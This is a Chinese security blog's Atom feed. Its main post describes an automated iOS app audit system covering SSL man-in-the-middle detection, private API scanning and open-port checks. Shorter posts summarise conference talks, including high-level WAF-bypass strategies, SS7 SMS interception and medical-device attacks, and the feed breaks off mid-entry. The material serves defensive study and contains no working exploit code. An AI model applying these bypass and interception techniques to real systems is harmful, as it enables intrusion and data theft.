<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>riusksk&#39;s blog</title>
  <subtitle>攀蟾折桂摄寰宇，摘星揽月御乾坤。踏云踩雾骋宵壤，驱风逐日闯天地。 ------泉哥</subtitle>
  <link href="//atom.xml" rel="self"/>
  
  <link href="http://riusksk.github.io/"/>
  <updated>2016-06-23T06:23:41.000Z</updated>
  <id>http://riusksk.github.io/</id>
  
  <author>
    <name>riusksk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅谈iOS应用安全自动化审计</title>
    <link href="http://riusksk.github.io/2016/06/23/ios-auditor/"/>
    <id>http://riusksk.github.io/2016/06/23/ios-auditor/</id>
    <published>2016-06-22T16:00:00.000Z</published>
    <updated>2016-06-23T06:23:41.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;此前有人统计过2015年漏洞最多的产品，苹果的OSX与iOS系统分别占据第一二名，虽有人怀疑统计数据可能存在重复的不准确情况，但相信大趋势是不会变的。&lt;/p&gt;
&lt;p&gt;2015年在iOS平台上也发生过不少安全大事，比如“XcodeGhost”事件、iOS9越狱、“iBackDoor“、“YouMi“事件等等，尤其是XcodeGhost影响甚大，注定要在iOS安全史上留下重重的一笔。&lt;/p&gt;
&lt;p&gt;结合CVEDetails站点上对iOS系统漏洞的统计情况【图1】，整体处于上升的趋势，尤其是2015年增长迅速，是2014年的3倍多，由此也可以预见iOS平台上的安全漏洞正在快速增长，iOS应用亦然。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图1：iOS系统历年漏洞数量统计图&lt;br&gt;&lt;/center&gt;

&lt;p&gt;腾讯也有很多iOS应用产品，基本上android上有的，对应的同款应用在iOS上也会有。目前Android应用的审计技术在业界都已经于相对成熟，而iOS应用漏洞审计系统在国内还是比较欠缺的，一些公司可能内部有开发，只是未公开。&lt;/p&gt;
&lt;p&gt;此前腾讯iOS产品也是未能做有效的上线前审计，遗留一些安全隐患，因此我们对此专门研发了一款针对iOS应用的自动化审计系统。除了日常的应用审计外，同时也是希望它能够在安全应急上起到辅助的作用。本文主要就是针对它使用到的一些技术进行浅谈，以希望可以起到抛砖引玉的效果。&lt;/p&gt;
&lt;h3 id=&quot;开发环境&quot;&gt;&lt;a href=&quot;#开发环境&quot; class=&quot;headerlink&quot; title=&quot;开发环境&quot;&gt;&lt;/a&gt;开发环境&lt;/h3&gt;&lt;p&gt;• Mac OS X 10.11&lt;br&gt;• Python 开发环境：PyCharm5&lt;br&gt;• Objective-C 开发环境：Xcode7 + iOSOpenDev&lt;br&gt;• 支持 iOS 8.1 以上的越狱系统&lt;/p&gt;
&lt;h3 id=&quot;系统架构&quot;&gt;&lt;a href=&quot;#系统架构&quot; class=&quot;headerlink&quot; title=&quot;系统架构&quot;&gt;&lt;/a&gt;系统架构&lt;/h3&gt;&lt;p&gt;整个iOS应用审计系统主要分两部分：静态审计和动态审计【图2】。静态审计包括Bin文件漏洞审计、第三方库检测以及私有API静态检测等功能；动态审计主要通过Hook去监控网络数据包、SSL中间人检测，以及实现ipa的动态安装和运行、文件上传下载等基本功能。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图2：iOS应用审计系统架构图&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;基本审计功能&quot;&gt;&lt;a href=&quot;#基本审计功能&quot; class=&quot;headerlink&quot; title=&quot;基本审计功能&quot;&gt;&lt;/a&gt;基本审计功能&lt;/h3&gt;&lt;p&gt;通过静态审计提取基本的文件信息，并以较好的展示效果输出到报告页面上【图3】，也方便后面的二次扫描，以及鉴别不同的ipa文件。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;    图3：文件信息及漏洞统计图&lt;br&gt;    &lt;/center&gt;

&lt;p&gt;在静态审计里最重要的就是Bin文件漏洞检测功能【图4】，像编译选项和使用函数的信息，借助otool即可很容易检测。&lt;/p&gt;
&lt;p&gt;应用漏洞检测主要针对目前已公开的漏洞/恶意后门进行检测，比如XcodeGhost、iBackDoor、AFNetworking等等，先通过分析样本来制定静态检测规则，多数通过关键字符串即可检测出，而对于AFNetworking SSL中间人漏洞，笔者是采用检测漏洞相关的ARM指令。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图4：BIN静态审计功能&lt;br&gt;&lt;/center&gt;

&lt;p&gt;下面是AFNetworking某个漏洞版本的ARM指令【图5】，不同版本会有一定差异，所以还是需要对比多个不同版本，提取通用的检测规则（单纯检测下图标红的ARM指令会误报）。除此之外，还要对比修复版本的代码，避免误报。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图5：AFNetworking SSL 中间人漏洞代码&lt;br&gt;&lt;/center&gt;

&lt;p&gt;由于iOS应用为了兼容性，都会包含32位与64位程序，很少会单纯只使用64位编译的应用，所以检测时可以暂不用考虑64位问题。&lt;/p&gt;
&lt;p&gt;除图4上的应用漏洞之外，还支持自定义审计功能【图6】，主要是为了在应急时，可以及时即时制定规则进行批量扫描【图7】，我们也专门针对公司业务情况添加了一些规则，此处就不赘述了。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/6.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图6：自定义审计规则示例（非实际运用规则）&lt;br&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图7：应用批量扫描&lt;br&gt;&lt;/center&gt;

&lt;p&gt;上面【图6】只是一份示例的规则，并非在系统上实际运用的，只是作为演示，它支持二进制、数据库及文件的扫描，里面可以使用linux命令去辅助检测，当然你也可以笑称它为“后门”。&lt;/p&gt;
&lt;p&gt;另外，数据存储安全和网络传输安全都在动态审计部分完成，审计规则在自定义规则里面定义的。其中网络实时检测功能主要是基于Hook实现的，针对发包函数进行监控，比如NSURLConnection:sendSynchronousRequest 或者UIApplication:openURL等等【图8】。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图8：通过Hook网络相关API实现监听&lt;br&gt;&lt;/center&gt;

&lt;p&gt;程序会实时监听HTTP、HTTPS甚至是自定义伪协议的请求，而且为方便后续测试会记录cookie值，然后完整地输出到报告上【图9】，后续也可以把它导入扫描器作WEB漏洞扫描。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图9：网络请求实时监控&lt;br&gt;&lt;/center&gt;

&lt;p&gt;由于著名第三方库AFNetwork经常被使用，因此笔者也增加了对它的网络监控。&lt;/p&gt;
&lt;h3 id=&quot;UI界面遍历&quot;&gt;&lt;a href=&quot;#UI界面遍历&quot; class=&quot;headerlink&quot; title=&quot;UI界面遍历&quot;&gt;&lt;/a&gt;UI界面遍历&lt;/h3&gt;&lt;p&gt;为了触发更多地程序逻辑，增加代码覆盖率，在动态检测时，就需要去遍历各个UI界面。对于这种情况，我们选用appcrawler工具进行UI遍历，它同时支持Android与iOS应用，而在其提供的config.json配置文件里面，可根据自身需要去灵活配置，比如遍历的深度，匹配文本框关键字进行输入（如登录帐号），这些规则需要自己多测试应用去完善它。【图10】是遍历微信UI的部分截图效果，由于只遍历了10分钟，所以截图相对较少一些，整体效果还是不错的。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图10：遍历微信UI的部分截图&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;SSL中间人检测&quot;&gt;&lt;a href=&quot;#SSL中间人检测&quot; class=&quot;headerlink&quot; title=&quot;SSL中间人检测&quot;&gt;&lt;/a&gt;SSL中间人检测&lt;/h3&gt;&lt;p&gt;在移动APP中，无论是Android还是iOS平台，SSL中间人攻击都是一种常见漏洞，经常是由于证书校验不严谨导致的。虽然是中间人攻击，但在一定场景下还可以造成很大的危害，尤其是金融场所里面的WiFi，常常是最好的攻击点。&lt;/p&gt;
&lt;p&gt;针对SSL中间人漏洞，如果采用静态代码检测，可能误报率会比较高，笔者在此处是通过Hook做静态检测，在运行时注入证书异常站点的请求，然后再去检测是否访问成功【图11】。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/11.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图11：SSL中间人动态检测原理&lt;br&gt;&lt;/center&gt;

&lt;p&gt;以QQ浏览器HD为例，注入异常站点后会弹出【图12】中的提示，说明不会自动连接此站点，因此不存在SSL中间人漏洞。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/12.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图12：检测效果&lt;br&gt;&lt;/center&gt;

&lt;p&gt;不过对于使用第三方SSL库的应用可能会漏报，另一种替代方案是使用证书替换的检测方式，不过这会导致访问异常，最终可能导致应用无法正常使用，后续的审计动作也将被中止。各有各的弊端，可以暂时两者分开地使用，如果各位同仁有更好的检测方法，也欢迎在下面回复讨论。&lt;/p&gt;
&lt;h3 id=&quot;私有API检测&quot;&gt;&lt;a href=&quot;#私有API检测&quot; class=&quot;headerlink&quot; title=&quot;私有API检测&quot;&gt;&lt;/a&gt;私有API检测&lt;/h3&gt;&lt;p&gt;虽说调用私有API不算漏洞，但因为苹果严格的审计机制，一经发现调用私有API会直接下架应用，对业务影响也是很大。&lt;/p&gt;
&lt;p&gt;另外从安全角度看，如果应用的漏洞修复版本需要发布，但多次因为调用私有API也被苹果官方拒绝上架，就会导致漏洞无法得到及时的修复。&lt;/p&gt;
&lt;p&gt;检测私有API的难点主要在于苹果未公开这份私有API列表，因此在检测时只能自己提取，但也导致会因此存在一定的漏报和误报的情况。&lt;/p&gt;
&lt;p&gt;网络上有个提取私有API的公式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;私有的api ＝ (class-dump Framework下的库生成的头文件中的api - (Framework下的头文件里的api = 有文档的api + 没有文档的api)) + PrivateFramework下的api&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实这是不完全正确的，如果你单纯按照这种方法提取，会出现很高的误报和漏报情况。因为私有类里面有公有API，公有类里面有私有API。但上面的公式是提取私有API的第一步，之后就需要再做很多提取规则逐步完善，比如一些纯小写字母的api，大多是一些c库函数，可以再过滤一大批。&lt;/p&gt;
&lt;p&gt;这种没有什么特别好的方法，只能多扫应用，根据结果多优化规则。&lt;/p&gt;
&lt;p&gt;Github上面也有用于检测私有API的开源项目，但基本上没有一个可以满足测试需求的，误报率和漏报率太高，而且支持iOS版本较低。iOS9 SDK以上版本，也不能直接使用classdump去提取头文件，因为应用的符号表已经被去掉这些信息，笔者是采用nm去解决的。&lt;/p&gt;
&lt;p&gt;最初笔者是打算把动态检测私有API也做了，但后面考虑审计系统主要是面向公司内部，因此不存在那种恶意绕过私有API检测的行为，然后就把写了一半的动态检测功能给注释掉。&lt;/p&gt;
&lt;p&gt;如果读者要做动态检测私有API，那么误报和性能就是首要考虑的问题。hook太深，则消息过多，时耗过多，而且有些是系统自身调用的私有API，就无法正确区分是应用还是系统调用的；hook太浅，又达不到效果，没法监测到私有API的行为。这里抛张动态检测的半成品截图【图13】，大家可以继续发挥。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/13.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图13：动态检测私有API时的Hook日志（半成品）&lt;br&gt;&lt;/center&gt;

&lt;p&gt;为了提高静态检测的准确率，笔者就把静态拼接API字符串的情况也支持【图14】，因为正常情况下，两个字符串都是相邻的，组合起来再与私有API库作比较即可。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;![](/media/ios_auditor/14.png&lt;br&gt;图14：字符串拼接绕过私有API检测&lt;br&gt;&lt;/center&gt;

&lt;p&gt;好了，说了这么多，直接上一张实战图。下面【图15】是针对去年曝光的一款iOS病毒TinyV做的检测（感谢ClaudXiao分享的样本），可以看到它调用LSApplicationWorkspace和MobileInstallation中的私有API去查看安装程序列表，安装和卸载应用。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/15.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图15：iOS病毒TinyV的私有API检测结果&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;第三方库检测&quot;&gt;&lt;a href=&quot;#第三方库检测&quot; class=&quot;headerlink&quot; title=&quot;第三方库检测&quot;&gt;&lt;/a&gt;第三方库检测&lt;/h3&gt;&lt;p&gt;有时外界会曝光一些第三方开源库的漏洞，影响经常是跨平台的，包括iOS应用。因此我们专门收集上百个常用第三方库信息作为检测内容，在日常审计应用时，能够维护一份哪些公司产品使用到哪些第三方库的信息【图16】，在外部曝光漏洞后，我们可以快速定位受影响的产品及危害范围。&lt;/p&gt;
&lt;p&gt;不过目前缺乏相应的版本信息，因为有些库编译出来后是不带版本字符串，需要针对不同版本作指纹库检测，也是个不少工程量，如果业界有好心人愿意造服群众的话，可以试试做个第三方库的指纹库出来。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/16.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图16：第三方库检测&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;开放端口检测&quot;&gt;&lt;a href=&quot;#开放端口检测&quot; class=&quot;headerlink&quot; title=&quot;开放端口检测&quot;&gt;&lt;/a&gt;开放端口检测&lt;/h3&gt;&lt;p&gt;之所以做开放端口检测这个功能，主要是基于此前曝光的“WormHole”漏洞，此类因开放端口导致的安全漏洞，在Android应用上已经有过不少案例，搜索乌云就能找到。&lt;/p&gt;
&lt;p&gt;检测开放端口其实一条命令就足够了，然后定期轮循即可：&lt;br&gt;lsof -i | grep ‘“+appname+”‘ | awk ‘{print $1,$8,$9,$10}’&lt;/p&gt;
&lt;p&gt;直接上效果图，如【图17】所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/17.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图17：开放端口审计&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;审计效果&quot;&gt;&lt;a href=&quot;#审计效果&quot; class=&quot;headerlink&quot; title=&quot;审计效果&quot;&gt;&lt;/a&gt;审计效果&lt;/h3&gt;&lt;p&gt;我们随机抽取了公司60款iOS应用，审计后共发现10款产品存在中高危漏洞【图18】，其中主要是SSL中间人漏洞和授权密钥泄露漏洞居多。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/18.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图18：审计结果&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;后记&quot;&gt;&lt;a href=&quot;#后记&quot; class=&quot;headerlink&quot; title=&quot;后记&quot;&gt;&lt;/a&gt;后记&lt;/h3&gt;&lt;p&gt;本文主要针对笔者在开发iOS应用自动审计系统时运用的一些技术作个分享，希望能起到抛砖引玉的作用。系统本身也还有一些有待完善的地方，欢迎各位业界同仁共同交流探讨。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;此前有人统计过2015年漏洞最多的产品，苹果的OSX与iOS系统分别占据第一二名，虽有人怀疑统计数据可能存在重复的不准确情况，但相信大趋势是
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="安全审计" scheme="http://riusksk.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="iOS" scheme="http://riusksk.github.io/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>迁移技术文章</title>
    <link href="http://riusksk.github.io/2016/06/17/add-articles/"/>
    <id>http://riusksk.github.io/2016/06/17/add-articles/</id>
    <published>2016-06-17T08:11:06.000Z</published>
    <updated>2016-06-17T08:24:10.000Z</updated>
    
    <content type="html">&lt;p&gt;由于博客大巴体验太差，因此开始启用github去写博客，用markdown+hexo写静态博客的感觉也挺好的，而且更安全。&lt;br&gt;后面我会把以前写的技术文章迁移到本博客，顺便把买来很久一直未用的riusksk.me域名给派上用场了，之前是因为备案流程过于繁琐，才导致一直未使用，使用 &lt;a href=&quot;http://riusksk.me&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://riusksk.me&lt;/a&gt; 解析到 &lt;a href=&quot;http://riusksk.github.io&quot;&gt;http://riusksk.github.io&lt;/a&gt; ，似乎就不用备案了。&lt;br&gt;近日，我已在本博客上添加RSS订阅和评论功能，欢迎大家订阅和交流。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;由于博客大巴体验太差，因此开始启用github去写博客，用markdown+hexo写静态博客的感觉也挺好的，而且更安全。&lt;br&gt;后面我会把以前写的技术文章迁移到本博客，顺便把买来很久一直未用的riusksk.me域名给派上用场了，之前是因为备案流程过于繁琐，才导致一直未使
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>PHDays安全大会议题分析</title>
    <link href="http://riusksk.github.io/2016/05/25/PHDays-2016/"/>
    <id>http://riusksk.github.io/2016/05/25/PHDays-2016/</id>
    <published>2016-05-25T02:09:17.000Z</published>
    <updated>2016-06-05T02:45:15.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;大会简介&quot;&gt;&lt;a href=&quot;#大会简介&quot; class=&quot;headerlink&quot; title=&quot;大会简介&quot;&gt;&lt;/a&gt;大会简介&lt;/h2&gt;&lt;p&gt;PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全等诸多专业安全领域，并且会议期间设有CTF夺旗竞技赛。&lt;/p&gt;
&lt;p&gt;今年会议主要围绕以下主题：关键信息系统的安全性、欺诈管理、网络犯罪和事故调查、维基解密时代的政府与企业安全、网络战和网络间谍。同时，还设有安全论坛，云计算和虚拟基础设施的保护，0day攻防、DDOS防御、工控安全、业务应用和通信网络安全。&lt;/p&gt;
&lt;h2 id=&quot;议题分析&quot;&gt;&lt;a href=&quot;#议题分析&quot; class=&quot;headerlink&quot; title=&quot;议题分析&quot;&gt;&lt;/a&gt;议题分析&lt;/h2&gt;&lt;p&gt;关于大会议题的在线视频参见：&lt;a href=&quot;http://www.phdays.com/broadcast/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.phdays.com/broadcast/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Building-Honeypots-to-Monitor-DDoS》&quot;&gt;&lt;a href=&quot;#1、《Building-Honeypots-to-Monitor-DDoS》&quot; class=&quot;headerlink&quot; title=&quot;1、《Building Honeypots to Monitor DDoS》&quot;&gt;&lt;/a&gt;1、《Building Honeypots to Monitor DDoS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641437211481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者通过搭建存在DDoS漏洞服务的网络蜜罐，从互联网中提取可视化信息，然后将数据反馈给ELK（Elasticsearch、Logstash、Kibana日志集中分析平台，为保护真实网络财产的系统提供数据支撑。据说，后面作者会开源一个网络管理系统，用于统计外部网络的一些反射DDoS攻击的数据。&lt;/p&gt;
&lt;h3 id=&quot;2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》&quot;&gt;&lt;a href=&quot;#2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》&quot; class=&quot;headerlink&quot; title=&quot;2、《Waf.js：How to Protect Web Applications using JavaScript》&quot;&gt;&lt;/a&gt;2、《Waf.js：How to Protect Web Applications using JavaScript》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641534353049.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;使用Javascript代码去防御DOM XSS、CSRF、点击劫持，以及其它攻击环境检测（Beef、Xbackdoor、Acunetix等等）的工具，与Server组使用js防御dom xss的思路类似，只是多了其它几项功能。文档下载：&lt;a href=&quot;http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》&quot;&gt;&lt;a href=&quot;#3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》&quot; class=&quot;headerlink&quot; title=&quot;3、《Scalable and Effective Fuzzing of Google Chrome Browser》&quot;&gt;&lt;/a&gt;3、《Scalable and Effective Fuzzing of Google Chrome Browser》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641573779613.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;介绍Google的分布式Fuzzing系统——CluterFuzz，采用集群服务器进行分布式Fuzzing，大概4000多台机器，不排除使用虚拟机的情况。议题介绍了一些Fuzz变异算法、漏洞类型识别、代码覆盖率问题、自动化精简样本，以及各种sanitizers功能的使用，比较常用的还是Address Sanitizer，且各平台通用。&lt;/p&gt;
&lt;h3 id=&quot;4、《Web-Application-Firewall-Bypassing》&quot;&gt;&lt;a href=&quot;#4、《Web-Application-Firewall-Bypassing》&quot; class=&quot;headerlink&quot; title=&quot;4、《Web Application Firewall Bypassing》&quot;&gt;&lt;/a&gt;4、《Web Application Firewall Bypassing》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641659037475.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;总结绕过AWF的三大策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1、预处理利用&lt;/strong&gt;：即设法绕过WAF的输入验证，比如HTTP头（X-Originating-IP、X-Forwarded-For、X-Remote-IP、X-Remote-Addr）的处理，就曾多次被用于绕过公司WAF的SQL注入防护，或者HTTP方法头GET/POST的篡改、换行符的处理等等方式；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2、致阻断失配&lt;/strong&gt;：利用前后端数据处理的差异，使得无法匹配到黑名单里的规则，通常结合一些参数污染、字符编码、注释符等多种方式绕过；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3、规则集绕过&lt;/strong&gt;：通过暴力枚举出WAF的拦截规则，或者逆向WAF程序获取规则，然后再设法绕过。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》&quot;&gt;&lt;a href=&quot;#5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》&quot; class=&quot;headerlink&quot; title=&quot;5、《Mobile Communications are Insecure. Evidence-Based Arguments》&quot;&gt;&lt;/a&gt;5、《Mobile Communications are Insecure. Evidence-Based Arguments》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14642298519901.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于当前移动通讯网络采用许多过旧技术，导致一些漏洞遗留其中，主要是针对SS7第7号信令系统的漏洞情况进行统计，其中主要三大威胁是：拒绝服务、信息泄露（比如短信、通话内容、IMEI、地理位置等等）、欺诈。并现场演示短信窃取，实现社交帐号的盗取，并成功获取历史聊天记录。&lt;/p&gt;
&lt;h3 id=&quot;6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》&quot;&gt;&lt;a href=&quot;#6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》&quot; class=&quot;headerlink&quot; title=&quot;6、《Fingerprinting and Attacking a Healthcare Infrastructure》&quot;&gt;&lt;/a&gt;6、《Fingerprinting and Attacking a Healthcare Infrastructure》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14642478498497.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;作者分享了一些关于医疗设备攻击的思路，比如通过网络空间搜索引擎Shodan/Censys/Maltego去查找网络上的医疗设备，介绍如何通过设备指纹去查找医疗设备，目前很多医疗设备存在允许未授权的访问，特别容易导致敏感信息泄露，甚至允许远程操作医疗设备，可能影响到患者的健康问题，最后他提供一些针对医疗设备攻击的防御方案。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;大会简介&quot;&gt;&lt;a href=&quot;#大会简介&quot; class=&quot;headerlink&quot; title=&quot;大会简介&quot;&gt;&lt;/a&gt;大会简介&lt;/h2&gt;&lt;p&gt;PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="PHDays" scheme="http://riusksk.github.io/tags/PHDays/"/>
    
  </entry>
  
  <entry>
    <title>CanSecWest 2016 大会议题分析</title>
    <link href="http://riusksk.github.io/2016/04/13/CanSecWest_2016/"/>
    <id>http://riusksk.github.io/2016/04/13/CanSecWest_2016/</id>
    <published>2016-04-13T03:47:32.000Z</published>
    <updated>2016-06-05T02:44:50.000Z</updated>
    
    <content type="html">&lt;p&gt;本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于&lt;strong&gt;系统/软件漏洞挖掘与利用技术&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;各议题下载链接参见：&lt;a href=&quot;http://www.slideshare.net/CanSecWest/presentations&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.slideshare.net/CanSecWest/presentations&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot;&gt;&lt;a href=&quot;#1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot; class=&quot;headerlink&quot; title=&quot;1、《Sandbox Escape with Generous Help from Security Software》&quot;&gt;&lt;/a&gt;1、《Sandbox Escape with Generous Help from Security Software》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605295530449.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯玄武实验室分享的杀毒软件漏洞挖掘技巧，比如BitDefender、Comodo、Avast、Kaspersky等等国外知名杀软厂商，大多是一些敏感功能未鉴权导致的代码执行或者信息泄露的问题，比如攻击者伪造IO请求去读写、执行本地文件。这里比较好的一点是在漏洞利用场景上，他们将杀软漏洞用来绕过沙盒保护，因为杀软漏洞可以直接以System最高权限执行，允许直接关闭一些软件的沙盒防护。&lt;/p&gt;
&lt;h3 id=&quot;2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》&quot;&gt;&lt;a href=&quot;#2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》&quot; class=&quot;headerlink&quot; title=&quot;2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》&quot;&gt;&lt;/a&gt;2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605302948646.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯科恩实验室分享的关于OSX/iOS内核驱动漏洞挖掘的方法，主要介绍了两种Fuzzing策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;被动Fuzzing&lt;/strong&gt;：&lt;strong&gt;通过Hook IOKit API（IOConnectMapMemory/IOConnectUnmapMemory/IOConnectCallMethod/IOConnectCallScalarMethod），随机变异参数值&lt;/strong&gt;；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主动Fuzzing&lt;/strong&gt;：&lt;strong&gt;通过脚本自动提取驱动的接口函数与参数信息，然后发送畸形数据去调用&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后列举一个竞争条件漏洞实例，介绍漏洞成因与利用方法。&lt;/p&gt;
&lt;h3 id=&quot;3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》&quot;&gt;&lt;a href=&quot;#3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》&quot; class=&quot;headerlink&quot; title=&quot;3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》&quot;&gt;&lt;/a&gt;3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605312840771.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
